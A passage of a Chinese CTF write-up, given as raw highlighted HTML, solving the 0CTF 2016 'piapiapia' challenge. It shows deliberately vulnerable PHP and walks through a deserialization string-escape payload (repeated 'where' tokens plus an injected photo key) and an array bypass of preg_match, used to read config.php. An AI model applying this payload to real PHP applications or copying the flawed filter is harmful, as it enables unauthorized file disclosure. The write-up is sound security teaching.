class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">register</span>.php就是简单的注册功能<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">//!</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//profile.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//注意这里的反序列化</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//注意这里的file_get_contents函数，可以利用其读取config.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//user对象访问update_profile方法，存在序列化</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag</code>在<code>config.php</code>中，要想办法读这个文件。<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>使我们可以利用的点，想办法让<code>profile</code>数组中<code>photo</code>键对应的值是<code>config.php</code>就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//注意这里的反序列化</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//注意这里的file_get_contents函数，可以利用其读取config.php</span><br></code></pre></td></tr></table></figure><p>通过<code>$profile</code>返回数组，然后对数组键值对进行读取赋值。那么前面肯定有个序列化的过程，我们跟踪到序列化部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//user对象访问update_profile方法，存在序列化</span><br><span class="hljs-comment">//update_profile:</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-comment">//update</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以抓个包看下我们<code>update</code>的数据是怎么传递的：</p><p><img src="/img/pia2.png" alt="pia2"></p><p>现在思路就清晰了：<code>POST</code>传递我们要更新的数据(<code>phone,email,nickname,photo</code>)并转换成数组形式(注意这里设置了<code>waf</code>)，<code>photo</code>会通过<code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;])</code>和<code>move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]))</code>上传到某个位置，然后利用<code>base64_encode(file_get_contents($profile[&#39;photo&#39;])</code>读取。</p><p>看下设置的<code>waf</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>正则匹配的话我们可以通过构造数组绕过，比如<code>nickname[]=点点点</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;zhengze.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未成功绕过！&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;成功绕过！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>/?nickname=[]=;&#125;即可</code></p><p>后面思路就是通过构造特殊的<code>nickname</code>让系统在序列化-反序列化过程中忽略真正的<code>photo</code>，去读<code>config.php</code></p><p>举个栗子(参考<code>https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</code>)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ss@q.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;sea_sand&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>));<br><br>结果如下：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [phone] =&gt; <span class="hljs-number">12345678901</span><br>    [email] =&gt; ss@q.com<br>    [nickname] =&gt; sea_sand<br>    [photo] =&gt; config.php<br>)<br><span class="hljs-comment">//可以看到反序列化之后，最后面upload这一部分就没了（也可以理解为闭合了）。吞掉了后面那部分。</span><br></code></pre></td></tr></table></figure><p>其实如果不限制是数组的话我们构造<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>然后通过字符串替换把这段吐出去就行，不过因为要是数组的形式，我们需要构造<code>”;&#125;s:5:“photo”;s:10:“config.php”;&#125;</code>(其实就在分号后多了个<code>&#125;</code>)</p><p>然后利用字符串替换把这34个字符吐出去：<code>where到hacker多了一个字符，我们需要34个where</code>:</p><p><code>payload:nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>经过序列化是这么个东西：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>因为检测到<code>where</code>，将其替换成<code>hacker</code>，变成：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;  s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这里我想说说具体怎么来的：<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>。因为数组的形式我们需要<code>&quot;;&#125;</code>闭合<code>nickname</code>的尾巴。反序列化”吐”出后会在<code>s:10:&quot;config.php&quot;;&#125;</code>再加个<code>&quot;;&#125;</code>去闭合我们构造的数组。</p><p>其实这个<code>&quot;;&#125;</code>有没有都无所谓的，反序列化到第一个<code>&quot;;&#125;</code>已经结束了。</p><p>然后抓包修改：</p><p><img src="/img/pia3.png" alt="pia3"></p><p><img src="/img/pia4.png" alt="pia4"></p><p><img src="/img/pia5.png" alt="pia5"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//源码</span><br>&lt;!--<br><span class="hljs-comment">//1st</span><br><span 